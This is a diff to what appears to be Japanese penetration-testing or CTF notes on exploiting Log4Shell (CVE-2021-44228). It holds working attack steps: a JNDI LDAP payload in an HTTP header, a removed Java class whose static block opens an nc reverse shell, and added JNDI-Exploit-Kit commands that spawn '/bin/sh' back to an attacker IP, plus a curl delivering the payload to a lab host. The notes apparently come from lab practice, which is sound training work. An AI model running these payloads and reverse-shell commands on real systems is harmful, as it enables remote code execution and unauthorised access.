@@ -568,7 +568,7 @@ https://github.com/christophetd/log4shell-vulnerable-app/blob/main/README.md
 
 ### テスト
 
-次のHTTPヘッダーを送って、接続が返れば脆弱性があると判断できる。
+次のHTTPヘッダーを送って、接続が返れば脆弱性があると判断できる。ヘッダーの種類はAcceptだけとは限らない。
 
 ```http
 Accept: ${jndi:ldap://<attacker-ip>:8888}
@@ -580,30 +580,14 @@ nc -lvnp 8888
 
 ### エクスプロイト
 
-JNDI の[リファラルサーバー](https://github.com/mbechler/marshalsec)を起動。8000ポートに転送する設定。
-
 ```sh
-java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.10.109.228:8000/#Exploit"
+git clone https://github.com/pimps/JNDI-Exploit-Kit
+cd JNDI-Exploit-Kit
+java -jar JNDI-Exploit-Kit.jar -C "nc 10.11.146.32 8888 -e /bin/sh" -A "10.11.146.32"
 ```
 
-リバースシェルのJavaを8000ポートでホスト。
-
-```java
-public class Exploit {
-    static {
-        try {
-            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-}
-```
-
-リファラルサーバーにリクエストさせると、最終的に9999ポートに接続が来る流れ。
-
 ```sh
-curl 'http://10.10.254.211:8983/solr/admin/cores?foo=$\{jndi:ldap://10.10.109.228:1389/Exploit\}'
+$ curl http://lumberjack.thm -H 'Accept: ${jndi:ldap://10.11.146.32:1389/5wvdvn}'
 ```
 
 ## CVE-2022-22965 (Spring4Shell)
